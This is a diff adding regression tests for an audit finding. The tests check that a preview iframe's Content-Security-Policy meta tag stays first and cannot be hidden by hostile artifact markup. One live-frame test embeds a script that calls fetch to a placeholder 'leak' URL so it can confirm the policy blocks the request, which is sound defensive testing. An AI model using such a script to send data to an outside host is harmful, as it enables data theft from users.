@@ -364,6 +364,63 @@ describe("preview iframe capability grants", () => {
 		expect(mermaidDeployed).not.toContain("Content-Security-Policy");
 	});
 
+	describe("the CSP cannot be hidden by the artifact's markup (audit M4)", () => {
+		const hostile = [
+			["a commented <head>", "<!--<head>--><p id=x>hi</p>"],
+			["a <header> element", "<header>top</header><p>hi</p>"],
+			["a <head in a script string", "<script>var s = '<head>';</script><p>hi</p>"],
+			[
+				"a comment before a real head",
+				"<!-- <head> --><html><head><title>t</title></head><body>b</body></html>",
+			],
+			["no head and no html", "<p>just a paragraph</p>"],
+			[
+				"an html document",
+				"<!doctype html><html lang=en><head><meta charset=utf-8></head><body>b</body></html>",
+			],
+			["uppercase tags", "<HTML><HEAD></HEAD><BODY>b</BODY></HTML>"],
+		] as const;
+
+		for (const [name, markup] of hostile) {
+			it(`puts the CSP first, before any artifact content: ${name}`, () => {
+				const doc = new DOMParser().parseFromString(buildHtmlSrcdoc(markup, "ch"), "text/html");
+				const first = doc.head.firstElementChild;
+				expect(first?.tagName).toBe("META");
+				expect(first?.getAttribute("http-equiv")).toBe("Content-Security-Policy");
+				expect(first?.getAttribute("content")).toBe(PREVIEW_CSP);
+				const metas = doc.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+				expect(metas.length).toBe(1);
+				// every script in the document comes after it
+				for (const script of doc.querySelectorAll("script")) {
+					expect(
+						(first as Element).compareDocumentPosition(script) & Node.DOCUMENT_POSITION_FOLLOWING
+					).toBeTruthy();
+				}
+			});
+		}
+
+		it("still enforces connect-src in a live frame when the artifact opens with a commented <head>", async () => {
+			const channel = "test_csp_comment";
+			const message = nextMessage(channel);
+			const iframe = document.createElement("iframe");
+			iframe.sandbox.add("allow-scripts");
+			iframe.srcdoc = buildHtmlSrcdoc(
+				`<!--<head>--><script>
+document.addEventListener("securitypolicyviolation", function (e) {
+  parent.postMessage({ channel: ${JSON.stringify(channel)}, type: "violation", directive: e.violatedDirective }, "*");
+});
+fetch("https://example.invalid/leak").catch(function () {});
+</script>`,
+				channel
+			);
+			document.body.appendChild(iframe);
+			iframes.push(iframe);
+			const result = (await message) as unknown as { type: string; directive: string };
+			expect(result.type).toBe("violation");
+			expect(result.directive).toMatch(/connect-src|default-src/);
+		});
+	});
+
 	it("delegates device-UX features to the frame but keeps privacy-sensitive ones and escape hatches blocked", async () => {
 		const res = await runInPreviewFrame(
 			"test_capabilities",
